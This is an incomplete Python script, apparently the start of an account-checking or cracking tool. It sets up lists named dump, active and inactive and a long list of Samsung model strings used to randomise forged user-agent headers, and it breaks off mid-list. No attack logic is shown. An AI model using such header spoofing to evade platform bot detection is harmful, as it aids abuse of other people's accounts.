
# create by ZORA ID 2024
# Status free Not premium

ME = '\x1b[1;91m' # MERAH
HU  = '\x1b[1;92m' # HIJAU

KG = '\x1b[1;93m' # KUNING
DT  = '\x1b[0m' # DEFAULT

import os, re, sys, json, time, random, requests, datetime, bs4
from rich.tree import Tree
from rich import print as printz
from asset.auth import author as aungthor
from concurrent.futures import ThreadPoolExecutor as excutor

bs = bs4.BeautifulSoup
dump, active, inactive = [],[],[]

class Requ:
    def __init_(self) -> None:
        pass
        
    def useragent(self):
        self.smg = random.choice(['samsung 19A', 'samsung a1', 'Samsung A10', 'Samsung A20', 'samsung A21', 'Samsung A33', 'Samsung A4', 'samsung A5', 'Samsung A50', 'Samsung A51', 'Samsung A52s', 'samsung A56', 'Samsung A7', 'samsung A7', 'Samsung A70', 'SAMSUNG A800F', 'SM-W750V', 'Trident/7.0', 'Trident/7.0', 'Samsung Chrome 11 (3180)', 'Samsung Chromebook Pro', 'Samsung Chromebook 3', 'Samsung Chromebook Plus (V2)', 'SAMSUNG F12', 'Samsung F41', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800D', 'GT-I5800', 'GT-I5800', 'SAMSUNG SM-A716S', 'SM-A015F', 'SM-A015M', 'SM-A013M', 'SM-A013F', 'SM-A013G', 'SM-A022F', 'SM-A022M', 'SM-S124DL', 'SM-A025V', 'SM-A025G', 'SM-A025F', 'SM-A025U', 'SM-A025M', 'SM-A025F', 'SAMSUNG SM-A035G', 'SM-A035M', 'SM-A035F', 'SAMSUNG SM-A035M', 'SM-A032F', 'SM-A032M', 'SM-A037U', 'SM-A037U1', 'SM-S134DL', 'SAMSUNG SM-A037F', 'SM-A037M', 'SM-A045M', 'SM-A045F', 'SAMSUNG SM-A045F', 'SM-A042F', 'SM-A042M', 'SAMSUNG SM-A042F', 'SM-A047F', 'SAMSUNG SM-A047F', 'SM-A105FN', 'SAMSUNG SM-A105FN', 'SM-A105G', 'SM-A105M', 'U', 'SM-S102DL', 'SM-A102U', 'SAMSUNG SM-A102U', 'SAMSUNG SM-A102U1', 'SM-A107M', 'SM-A107F', 'SM-A107F', 'SM-A115F', 'SM-S115DL', 'SM-A115M', 'SM-A115F', 'SAMSUNG SM-A125F', 'SM-A127F', 'SM-A125U', 'SM-A137F', 'SM-A135F', 'SM-A135U1', 'SAMSUNG SM-A135F', 'SAMSUNG SM-A137F', 'SM-A135M', 'SM-A136U', 'SM-S136DL', 'SM-A136W', 'SM-A136B', 'SM-A145R', 'SAMSUNG SM-A145R/A145RXXU1AWD1', 'SM-A145F', 'SM-A145P', 'SAMSUNG SM-A145F', 'SM-A146U', 'SM-A146P', 'SM-A146U1', 'SAMSUNG SM-A146U', 'SM-A260G', 'SM-A260F', 'SM-A260F', 'SM-A205U', 'SAMSUNG SM-A205U1', 'SM-A205F', 'SM-A205W', 'SM-A205G', 'SM-S205DL', 'SM-A205GN', 'SM-A202F', 'SAMSUNG SM-A202F', 'SM-A207F', 'SM-A207M', 'SM-S215DL', 'SM-A215U1', 'SAMSUNG SM-S215DL', 'SM-A102J', '720x1448', 'SC-42A', 'SM-A217F', 'SAMSUNG SM-A217F', 'SM-A217M', 'U', 'SM-A225F', 'SM-A225M', 'SAMSUNG SM-A225F', 'SAMSUNG SM-A226B', 'SM-A226BR', 'SM-A235F', 'SM-A235N', 'SM-A236B', 'SM-A236E', 'SM-A236U', 'SAMSUNG SM-A236M', 'SAMSUNG SM-A236U1', 'SM-A236V', 'SM-A245F', 'SAMSUNG SM-A245F', 'SM-A245M', 'Samsung Galaxy A24', 'SM-A300FU', 'SM-A300H', 'SM-A310F', 'SAMSUNG SM-A310F', 'SM-A310F', 'SM-A310M', 'SM-A320F', 'SM-A320FL', 'SAMSUNG SM-A320FL', 'SM-A305FN', 'SM-A305GN', 'SM-A305N', 'SM-A305GT', 'Flow', 'SM-A307FN', 'SM-A307GT', 'SM-A307GN', 'SM-A315G', 'SM-A315F', 'SM-A315N', 'SM-A325F', 'SM-A325M', 'SAMSUNG SM-A325F', 'SM-A326W', 'SM-A326U', 'SM-A326B', 'SAMSUNG SM-A326B', 'SM-S326DL', 'SM-A336B', 'SAMSUNG SM-A336E', 'SM-A336M', 'SM-A336N', 'SM-A346B', 'SM-A346M', 'SAMSUNG SM-A346M', 'SM-A3460', 'SM-A346E', 'SAMSUNG SM-A346B/A346BXXU1AWB9', 'SAMSUNG SM-A346E', 'SAMSUNG SM-A430F', 'SM-A405FN', 'SAMSUNG SM-A405FN', 'SM-A405FN', 'SM-A405FN/DS', 'SM-A405S', 'SM-A3050', 'SM-A3051', 'SM-A3058', 'SM-A415F', 'SC-41A', 'SM-A4260', 'SM-A426U', 'SM-A426U1', 'SM-A426U', 'SM-A426B', 'SAMSUNG SM-A426B/A426BXXU4DVL3', 'SM-A426N', 'SAMSUNG SM-A426U', 'SM-A5009', 'SM-A500YZ', 'SM-A500W', 'SM-A500L', 'SAMSUNG SM-A500W', 'SAMSUNG SM-A500L', 'SM-A500X', 'SM-A500XZ', 'SM-A500XZ', 'SM-A500XZ', 'SM-A510F', 'SAMSUNG SM-A510F', 'SM-A510F', 'SM-A520F', 'SAMSUNG SM-A520F', 'SM-A520K', 'SM-A500M', 'SM-A500H', 'SM-A500F', 'SM-A500F', 'SM-A500FU', 'SM-A505FN', 'SM-A505G', 'SM-A505FM', 'SM-A505U', 'SM-A507FN', 'SM-A515F', 'SM-A515F', 'SM-A515U', 'SM-A516U', 'SM-A516B', 'SM-A516B/DS', 'SM-A516N', 'SC-54A', 'SM-A516V', 'SCG07', 'SM-A525F', 'SAMSUNG SM-A525F', 'SM-A525M', 'SAMSUNG SM-A526B', 'SM-A526W', 'SM-A526U', 'SM-A5260', 'SM-A528B', 'SAMSUNG SM-A528B', 'SAMSUNG SM-A528B/A528BXXU3EWE1', 'SM-A536E', 'SM-A536B', 'SAMSUNG SM-A536E', 'SM-A5360', 'SM-A536U', 'SM-A536U1', 'SM-A536V', 'SAMSUNG SM-A536V', 'SM-A546U1', 'SM-A546E', 'SM-A546B', 'SM-A5460', 'SAMSUNG SM-A546U', 'SM-A546W', 'SM-A546V', 'SAMSUNG SM-A600FN', 'SM-A600G', 'SM-A605FN', 'SM-A605G', 'SM-A6050', 'SM-A605GN/DS', 'SAMSUNG SM-A605FN', 'SM-A6060', 'SM-A606Y', 'SAMSUNG SM-A606Y', 'SM-G6200', 'SM-G6200', 'SM-A7000', 'SM-A700FD', 'SM-A700K', 'SM-A700H', 'SM-A700YD', 'SM-A710F', 'SM-A7100', 'SM-A710K', 'SM-A710M', 'SM-A720F', 'SM-A750FN', 'SAMSUNG SM-A750FN', 'SM-A750N', 'SM-A750GN', 'SM-A705FN', 'SM-A705MN', 'SM-A705GM', 'SM-A705W', 'SM-A707F', 'SAMSUNG SM-A707F', 'SAMSUNG SM-A7070', 'SM-A715F', 'SM-A715W', 'SM-A715F', 'SM-A715F', 'SM-A716U', 'SM-A716U1', 'SAMSUNG SM-A716U', 'SM-A716V', 'SAMSUNG SM-A716U1', 'SM-A725F', 'SM-A725M', 'SAMSUNG SM-A725F', 'SAMSUNG SM-A736B', 'SM-A736B', 'SM-A530F', 'SAMSUNG SM-A530F', 'SM-A8000', 'SM-A810F', 'SM-A810YZ', 'SAMSUNG SM-A810YZ', 'SM-A810S', 'SM-A530N', 'SM-A530W', 'SAMSUNG SM-A530W', 'SAMSUNG SM-G885F', 'SM-G885Y', 'SAMSUNG SM-G885S', 'SAMSUNG SM-G885Y', 'samsung SM-G885F', 'SM-A730F', 'SM-A805F', 'SAMSUNG SM-A805F', 'SM-A8050', 'SM-A805N', 'SM-G8870', 'SM-G887F', 'SM-A8s', 'SAMSUNG SM-G8870', 'SM-A9000', 'SM-A920F', 'SAMSUNG SM-A920F/A920FXXS7CVI7', 'U', 'SM-A910F', 'SM-G887N', 'SM-G887N', 'SM-A910F', 'SM-A9100', 'SM-G8850', 'SAMSUNG SM-G8850', 'SM-G8858', 'SM-G8850', 'SAMSUNG SM-A908B', 'SM-A908N', 'SAMSUNG SM-A908B/A908BXXU5EVK3', 'SAMSUNG SM-A908B/A908BXXU5EVG6', 'SAMSUNG SM-A9080', 'SM-A9080', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830M', 'GT-S5830i', 'GT-S5830i', 'GT-S5830L', 'GT-S5830G', 'GT-S5830M', 'GT-S5830M', 'GT-S5830C', 'GT-S5830V', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'GT-I8160P', 'GT-I8160', 'GT-I8160P-ORANGE/I8160PBVLK3', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'SAMSUNG GT-I8160/I8160BOLK2', 'SAMSUNG GT-S7275R/S7275RXXUAMK2', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275R', 'SAMSUNG GT-S7275R-ORANGE', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275B', 'GT-S7275B', 'GT-S7275B', 'GT-S7275T', 'GT-S7275Y', 'SM-G313HY', 'SM-G313MY', 'SM-G313MU', 'SM-G316MY', 'SM-G316M', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G313HZ', 'SM-G313HU', 'SM-G313U', 'SM-G318H', 'GT-S7500', 'GT-S7500', 'SAMSUNG GT-S7500/S7500BUMB1', 'GT-S7500', 'GT-S7500', 'GT-S7500T', 'GT-S7500', 'GT-S7500W', 'GT-S7500T', 'GT-S7500L', 'GT-S7500L', 'GT-S7500T', 'GT-S7500L', 'GT-S7500T', 'SM-G357FZ', 'SM-G310HN', 'SAMSUNG SM-G357FZ/G357FZXXU1AOE1', 'SM-G357FZ', 'SC-01H', 'SC-01H', 'SM-G850F', 'SM-G850F', 'SM-G850M', 'SAMSUNG-SM-J327AZ', 'SAMSUNG SM-J327AZ', 'SM-J337AZ', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'SM-G386T', 'SM-G386T1', 'SM-G386T1', 'SAMSUNG SM-G386T', 'SM-G386T', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'SM-G3858', 'SM-G3858', 'SAMSUNG-SM-G3858_TD/1.0 Android/4.2.2 Release/10.15.2013 Browser/AppleWebKit534.30', 'SM-G3858', 'SM-G3858', 'SM-G3858', 'SM-A226L', 'SAMSUNG SM-A226L', 'SM-M236L', 'SAMSUNG SM-M236L', 'SM-C5000', 'SAMSUNG SM-C5000', 'SAMSUNG SM-C500X', 'SM-C5010', 'SAMSUNG SM-C5010', 'SAMSUNG SM-C5018', 'SM-C7000', 'SAMSUNG SM-C7000', 'SM-C7000', 'SM-C7010', 'SM-C701F', 'SAMSUNG SM-C7010', 'SAMSUNG SM-C701F', 'SM-C7018', 'SAMSUNG SM-C7100', 'SM-C7108', 'SAMSUNG SM-C7108', 'SM-C9000', 'SM-C900F', 'SM-C900Y', 'EK-GC100', 'EK-GC100', 'EK-GC100', 'EK-GC120', 'EK-GC200', 'EK-GC200', 'EK-GC110', 'EK-GC110', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330B', 'GT-B5330B', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330L', 'GT-I8262', 'GT-I8262', 'GT-I8262', 'GT-I8260', 'GT-I8262', 'GT-I8262B', 'GT-I8262D', 'GT-I8262D', 'GT-I8262B', 'SM-G355H', 'SM-G355M', 'SHW-M570S', 'SAMSUNG GT-I8580', 'SHW-M570S', 'SAMSUNG SHW-M570S', 'GT-I8580', 'GT-I8580', 'GT-I8580', 'SAMSUNG GT-I8580', 'SM-G3589W', 'SM-G3589W', 'SM-G3589W', 'SAMSUNG-SM-G3589W', 'SM-G386W', 'SM-G386F', 'SM-G3518', 'SM-G3586V', 'SM-G3586V', 'SM-G3518', 'SM-G3518', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G3568V', 'SM-G3568V', 'SM-G350E', 'SM-G350', 'SM-G3509I', 'SM-G3508J', 'SM-G3502I', 'SM-G3502C', 'SM-G360BT', 'SM-S820L', 'SM-G360H', 'SM-G360F', 'SM-G360T', 'SM-G360M', 'SM-G361H', 'SM-G361F', 'SM-G361HU', 'SAMSUNG SM-G361H', 'SCH-R740C', 'SGH-S730M', 'SGH-S730G', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SM-E500H', 'SM-E500F', '720x1280', 'SM-E500M', 'SM-E5000', 'SM-E500YZ', 'SM-E700H', 'SM-E700F', 'SM-E7009', 'SM-E700M', 'GT-I8730', 'GT-I8730', 'GT-i8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730T', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCOE1', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCNH1', 'SM-E025F', 'SM-F127G', 'SM-E135F', 'SM-E225F', 'SM-E236B', 'SAMSUNG SM-E236B', 'SM-F415F', 'SM-E426B', 'SAMSUNG SM-E426B', 'SM-E5260', 'SAMSUNG SM-E5260', 'SM-E625F', 'GT-S6810M', 'GT-S6810', 'GT-S6810P', 'GT-S6810B', 'GT-S6810L', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810E', 'GT-S6810M', 'GT-S6810P', 'GT-S6812C', 'GT-S6812', 'GT-S6812i', 'GT-S6812i', 'GT-S6812C', 'GT-S6812i', 'GT-S6812i', 'GT-S6812i', 'GT-S6812B', 'GT-S6812i', 'GT-S6812B', 'GT-S6812B', 'GT-S6790L', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790L', 'SC-04J', 'SC-02L', 'SM-F907B', 'SM-F900U', 'SM-F900F', 'SM-F907N', 'SM-F9000', 'SM-F900U1', 'SM-F900W', 'SM-G150NL', 'SM-G155S', 'SM-G150N0', 'SM-G150NS', 'SM-G1650', 'SM-W2015', 'SM-W2015', 'SAMSUNG-SM-W2015', 'GT-I9128I', 'GT-I9128I', 'GT-I9128E', 'SM-G7102', 'SM-G7102', 'SM-G7105', 'SM-G7106', 'SM-G7108', 'GT-I9082', 'GT-I9082', 'GT-I9082C', 'SM-G7202', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G7200', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G720N0', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G720N0', 'SM-G7202', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9168I', 'GT-I9168I', 'SAMSUNG-GT-I9168_TD Release/1.15.2014 Browser/AppleWebKit/534.30', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'SM-G531F', 'SM-G531H', 'SM-G530T', 'SM-G530H', 'SM-G530BT', 'SM-G530FZ', 'SM-G532F', 'SM-G531M', 'SM-G531BT', 'SAMSUNG-SM-J727AZ', 'SM-J100FN', 'SM-J100H', 'SM-J120H', 'SM-J120F', 'SM-J120FN', 'SM-J120H', 'SM-J111F', 'SM-J111M', 'SM-J110H', 'SM-J111M', 'SM-J110G', 'SM-J110F', 'SM-J105B', 'SM-J105H', 'SM-J105Y', 'SM-J106F', 'SM-J106H', 'SM-J106B', 'SM-J106M', 'SM-J200GU', 'SM-J200F', 'SM-J200M', 'SM-J200H', 'SM-J260F', 'SM-J260M', 'SM-J260G', 'SM-J260FU', 'SM-J260MU', 'SM-J260Y', 'SM-J200BT', 'SAMSUNG SM-J200BT', 'SM-G532G', 'SM-G532M', 'SM-G532MT', 'SM-J250G', 'SM-J250M', 'SM-J250F', 'SM-J250Y', 'SAMSUNG SM-J260AZ', 'SM-J3109', 'SM-J320Y', 'SM-J320H', 'SM-J320G', 'SM-J320FN', 'SM-J320V', 'SM-J320M', 'SAMSUNG-SM-J320A', 'SM-J330FN', 'SAMSUNG SM-J330F', 'SAMSUNG SM-J330FN/J330FNXXS4CUD3', 'SM-J330G', 'SM-J337P', 'SM-J337V', 'SAMSUNG SM-J337W', 'SM-J337U', 'SM-J337VPP', 'SM-J337R4', 'SM-J327V', 'SM-J327P', 'SM-J327R4', 'SM-S327VL', 'SM-S337TL', 'SAMSUNG SM-S327VL', 'SM-J327VPP', 'SM-S367VL', 'SAMSUNG SM-S367VL', 'SM-S357BL', 'SM-J327T1', 'SM-J3110', 'SM-J3119S', 'SAMSUNG-SM-J3119', 'SM-S320VL', 'SM-J337T', 'SM-J400F', 'SM-J400M', 'SM-J400G', 'SM-J400M', 'SM-J410F', 'SM-J410G', 'SM-J410F', 'SM-J410F', 'SM-J410F', 'SM-J415FN', 'SM-J415GN', 'Galaxy j5', 'SM-J500M', 'SM-J500G', 'SM-J500F', 'SM-J500H', 'SM-J500FN', 'SM-J510H', 'SM-J510FQ', 'SM-J510FN', 'SM-J510MN', 'SM-J510MN', 'SM-J510GN', 'SM-J530F', 'SAMSUNG SM-J530F/J530FXXS9CUE5', 'SM-G570M', 'SM-G570F', 'SM-G570Y', 'SM-J530Y', 'SAMSUNG SM-J530G', 'SM-J600FN', 'SM-J600GT', 'SM-J610FN', 'SM-J610F', 'SM-J610G', 'SM-J710F', 'SM-J700M', 'SM-J700H', 'SM-J710MN', 'SM-J710K', 'SM-J7108', 'SM-J700F', 'SM-J700P', 'SM-J710GN', 'SM-J700T', 'SM-J700T1', 'SAMSUNG SM-J727A', 'SM-J730K', 'SM-J727R4', 'SM-J727S','SM-J727U', 'SM-J737T1', 'SM-J737A', 'SM-J737V', 'SAMSUNG SM-J737U', 'SM-J737R4', 'SM-J737S', 'SM-J737P', 'SM-J701F', 'SM-J701MT', 'SM-S767VL', 'SM-S757BL', 'SAMSUNG SM-S767VL', 'SM-J720F', 'SM-J720M', 'SM-G615F', 'SAMSUNG SM-G615F', 'SM-G615FU', 'SM-G615F', 'SM-G610F', 'SM-G610M', 'SM-G610Y', 'SM-G611MT', 'SM-G611FF', 'SM-G611FF', 'SM-J730G', 'SM-J730F', 'SM-J730FM', 'SM-S727VL', 'SM-S737TL', 'SAMSUNG SM-S727VL', 'SAMSUNG SM-J727T1', 'U', 'SM-J727V', 'SM-J727P', 'SM-J727VPP', 'SM-C710F', 'SAMSUNG SM-C710F', 'SM-J810F', 'SM-J810Y', 'SM-J810M', 'SM-J810G', 'SM-J810M', 'SM-J8 Plus', 'SM-J8 Pro', 'SM-J8 Pro', 'SM-J8 Pro[9]', 'SM-J8 Pro [9]', 'SM-A605K', 'SAMSUNG SM-A605K/KKS3CVH2', 'SAMSUNG SM-A605K/KKU1ARG2', 'SAMSUNG SM-A605K/KKU3CTF2', 'SM-A202K', 'SAMSUNG SM-A202K/KKS8CWA1', 'SAMSUNG SM-M336K/KSU4CWD2', 'SAMSUNG SM-M336K/KSU4CWB3', 'SAMSUNG SM-M336K/KSU3BWA2', 'SM-A326K', 'SAMSUNG SM-A326K/KSS4DWC5', 'SAMSUNG SM-A326K/KSU3CVK5', 'SAMSUNG SM-A326K/KSU4DWB7', 'SAMSUNG SM-A326K/KSS3BVI2', 'SM-C115', 'SM-C115L', 'SM-C1158', 'SAMSUNG-SM-C1158_TD Android/4.4.2 Release/04.15.2014 Browser/AppleWebKit537.36', 'SM-C115W', 'SM-C115M', 'SM-S120VL', 'SAMSUNG SM-S120VL', 'SM-M015G', 'SM-M015F', 'SAMSUNG SM-M015G', 'SAMSUNG SM-M015F', 'SM-M013F', 'SAMSUNG SM-M013F', 'SM-M017F', 'SAMSUNG SM-M017F', 'SM-M022F', 'SM-M022G', 'SM-M025F', 'SM-M025F/DS', 'SM-E045F', 'SM-M045F', 'SM-M105M', 'SM-M105F', 'SM-M105G', 'SM-M107F', 'SAMSUNG SM-M107F', 'SM-M115F', 'SM-M127F', 'SM-M127G', 'SM-M135F', 'SAMSUNG SM-M135F', 'SM-M135FU', 'SM-M135M', 'SM-M136B', 'SAMSUNG SM-M136B', 'SM-M146B', 'SAMSUNG SM-M146B', 'SM-M205F', 'SM-M205M', 'SM-M205FN', 'SM-M205F', 'SM-M215F', 'SM-M215G', 'SAMSUNG SM-M215G', 'SM-M225FV', 'SAMSUNG SM-M225FV', 'SM-M236B', 'SAMSUNG SM-M236B', 'SM-M305F', 'SM-M305M', 'SM-M305M/DS', 'SM-M305F', 'SM-M307F', 'SM-M307FN', 'SM-M3070', 'SM-M307F', 'SM-M315F', 'SM-M315F/DS', 'SM-M317F', 'SAMSUNG SM-M317F', 'SM-M317F/DSN', 'SM-M325FV', 'SAMSUNG SM-M325FV', 'SM-M326B', 'SAMSUNG SM-M326B', 'SM-M336BU', 'SAMSUNG SM-M336B', 'SM-M405F', 'SAMSUNG SM-M405F', 'SM-M426B', 'SM-M515F', 'SM-M515F/DSN', 'SM-M526BR', 'SM-M536B', 'SAMSUNG SM-M536B', 'SM-M536B', 'SM-M625F', 'SM-M625F/DS', 'SAMSUNG SM-M625F', 'SGH-I527M', 'SM-G750H', 'SM-G7508Q', 'SM-G7509', 'SAMSUNG-SM-G750A', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'SM-N970U', 'SM-N9700', 'SM-N970F', 'SM-N970U', 'SM-N971N', 'SM-N770F', 'SAMSUNG SM-N770F', 'SM-N975U', 'SM-N975F', 'SM-N975U1', 'SAMSUNG SM-N976B/N976BXXS8HWC5', 'SM-N976U', 'SM-N976N', 'SGH-I317M', 'Samsung Galaxy Note 2', 'SM-N980F', 'SAMSUNG SM-N980F', 'SAMSUNG SM-N981B', 'SM-N9810', 'SM-N981U', 'SM-N981N', 'SM-N985F', 'SAMSUNG SM-N985F', 'SM-N986U1', 'SM-N986B', 'SAMSUNG SM-N986B', 'SAMSUNG SM-N986U', 'SM-N986N', 'SM-N9008V', 'SM-N9006', 'SAMSUNG-SM-N900A', 'SM-N9005', 'SM-N900W8', 'Samsung GALAXY Note 3', 'SM-N900L', 'SM-N9009', 'SM-N900T', 'SM-N900P', 'SM-N9000Q', 'SAMSUNG SM-N9002', 'SM-N9002', 'SAMSUNG SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-9005', 'SM-9005', 'SM-N750L', 'SM-N7505', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SM-N9100', 'SM-N910C', '1440x2560', 'SM-N910V', 'SM-N910H', 'SM-N910U', 'SM-N9108V', 'SM-N915FY', 'SM-N915T', 'SM-N9150', 'SM-N915G', 'SM-N915A', 'SM-N915S', 'SM-N915D', 'SM-N915W8', 'SM-N916L', 'SM-N916S', 'SM-N916K', 'SM-N916LSK', 'SM-N920C', 'SM-N920L', 'SAMSUNG SM-N920C', 'SAMSUNG-SM-N920A', 'SM-N920K', 'SM-N920S', 'SM-N920G', 'SM-N920V', 'SM-N920I', 'SM-N9208', 'SM-N930F', 'SM-N9300', 'SM-N930x', 'SM-N930P', 'SM-N930X', 'SM-N930W8', 'SM-N930V', 'SM-N930T', 'SM-N9500', 'SM-N950U', 'SM-N950F', 'SM-N950N', 'SAMSUNG SM-N950F', 'SM-N960U', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960W', 'SC-01G', 'SCL24', 'SAMSUNG SCL24', 'SM-N935S', 'SM-N935F', 'SM-N935K', 'SM-N935L', 'N7100', 'GT-N7100', 'SAMSUNG GT-N7100', 'GT-N7100', 'GT-N7105', 'GT-N7105T', 'SAMSUNG GT-N7105/N7105XXDMC3', 'GT-N7105T', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'Galaxy Note N8000', 'Galaxy Note20', 'SAMSUNG EK-GN120', 'SM-G550T', 'SM-G5500', 'SM-G550FY', 'SM-G5510', 'SM-G550T1', 'SM-S550TL', 'SM-G5528', 'SM-G5528', 'SM-G600FY', 'SM-G600F', 'SM-G6000', 'SM-G6100', 'SM-G610S', 'SM-G611F', 'SM-G611L', 'SM-G611S', 'SAMSUNG SM-J710FN', 'P1 Galaxy Plus', 'SM-G110M', 'SM-G110H', 'SM-G110B', 'SM-G110H', 'SM-G110H', 'GT-S5310', 'GT-S5310I', 'GT-S5310C', 'GT-S5310B', 'GT-S5310T', 'GT-S5310G', 'GT-S5310E', 'GT-S5310E', 'GT-S5310L', 'GT-S5310G', 'GT-S5310', 'GT-S5310G', 'GT-S5301B', 'GT-S5301B', 'Gt-s5301b', 'GT-S5301B', 'GT-S5301', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'SAMSUNG GT-S5301/S5301XXAMA3', 'GT-S5301B', 'GT-S5301L', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510L', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510', 'SM-A826S', 'SAMSUNG SM-A826S', 'SAMSUNG SM-M536S', 'SM-G910S', 'SM-G910S', 'SM-G910S', 'SAMSUNG SM-G910S', 'GT-I9000', 'GT-I9000', 'GT-I9088', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9008', 'GT-i9008', 'GT-I9000', 'GT-I9000', 'GT-I9000B', 'GT-I9000M', 'GT-I9000', 'GT-I9070', 'GT-I9070', 'GT-I9070', 'GT-I9070P', 'GT-I9070P', 'SAMSUNG GT-I9070/I9070BULK1', 'GT-I9070', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562L', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'SPH-D710', 'SHV-E120S', 'SHV-E120L', 'SHV-E120K/KKJMD2', 'SHV-E120L', 'SHV-E120LSK', 'SHV-E120LSK', 'SHV-E120LKS', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S/KKJMD2', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'ISW11SC', 'SCH-I535', 'GT-I9300', 'GT-I9300', 'GT-I9305', 'SCH-R530X', 'SCH-R530X', 'SCH-R530U', 'GT-I9305T', 'SCH-R530C', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190N', 'GT-I8190', 'GT-I8190T', 'GT-I8190N', 'GT-I8200N', 'GT-I8200', 'GT-I8200', 'GT-I8200N', 'GT-I8200', 'GT-I8200L', 'GT-I8200', 'GT-I8200Q', 'GT-I8200Q', 'GT-I9301I', '720x1280', 'Samsung Galaxy S IV(I950X)', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SAMSUNG GT-I9001/I9001BOKQ4', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SM-G973F', 'SAMSUNG SM-G973F', 'SAMSUNG SM-G973U', 'SM-G977N', 'SM-G973U1', 'SAMSUNG SM-G973F/G973FXXSGHWC2', 'SAMSUNG SM-G977N', 'SAMSUNG SM-G770F', 'SM-G770F/DS', 'SM-G975F', 'SAMSUNG SM-G975F', 'SM-G975U', 'SM-G975U1', 'SAMSUNG SM-G975U', 'SAMSUNG SM-G975F/G975FXXSGHWC2', 'SC-05L', 'SM-G970F', 'SAMSUNG SM-G970F/G970FXXSGHWA3', 'SM-G970U', 'SM-G970U1', 'SAMSUNG SM-G980F', 'SM-G980F/DS', 'SM-G981U', 'SM-G981U', 'SM-G981B', 